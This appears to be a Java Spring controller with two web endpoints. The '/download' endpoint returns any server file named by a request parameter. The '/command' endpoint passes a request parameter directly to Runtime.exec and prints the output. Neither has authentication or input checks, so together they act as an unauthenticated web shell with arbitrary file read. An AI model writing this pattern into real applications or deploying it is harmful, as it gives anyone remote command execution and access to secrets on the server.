package cn.com.easy.controller;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.net.URLEncoder;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import cn.com.easy.utils.ResponseOutputUtils;

/**
 * 控制器
 * 
 * @author nibili 2016年11月15日
 * 
 */
@Controller
@RequestMapping("/mybase")
public class MyBaseController {

	/**
	 * 下载
	 * 
	 * @param request
	 * @param response
	 * @param file
	 * @param encode
	 * @author nibili 2016年11月15日
	 */
	@RequestMapping("/download")
	public void download(HttpServletRequest request, HttpServletResponse response, String file, String encode) {
		try {
			if (StringUtils.isBlank(encode) == true) {
				encode = "utf-8";
			}
			byte[] data = FileUtils.readFileToByteArray(new File(file));
			String fileName = URLEncoder.encode(file, encode);
			response.reset();
			response.setHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
			response.addHeader("Content-Length", "" + data.length);
			response.setContentType("application/octet-stream;charset=UTF-8");
			OutputStream outputStream = new BufferedOutputStream(response.getOutputStream());
			outputStream.write(data);
			outputStream.flush();
			outputStream.close();
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}

	/**
	 * 
	 * @param request
	 * @param response
	 * @param order
	 * @author nibili 2016年11月15日
	 */
	@RequestMapping("/command")
	public void command(HttpServletRequest request, HttpServletResponse response, String command, String encode) {
		try {
			if (StringUtils.isBlank(encode) == true) {
				encode = "utf-8";
			}
			Process p = Runtime.getRuntime().exec(command);
			ResponseOutputUtils.renderHtml(response, "----Rrror----" + "<br/>");
			List<String> resList = IOUtils.readLines(p.getErrorStream(), encode);
			if (CollectionUtils.isNotEmpty(resList) == true) {
				for (String temp : resList) {
					ResponseOutputUtils.renderHtml(response, temp + "<br/>");
				}
			}
			ResponseOutputUtils.renderHtml(response, "----sucess----" + "<br/>");
			resList = IOUtils.readLines(p.getInputStream(), encode);
			if (CollectionUtils.isNotEmpty(resList) == true) {
				for (String temp : resList) {
					ResponseOutputUtils.renderHtml(response, temp + "<br/>");
				}
			}
			ResponseOutputUtils.renderHtml(response, "----End----" + "<br/>");
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}
}
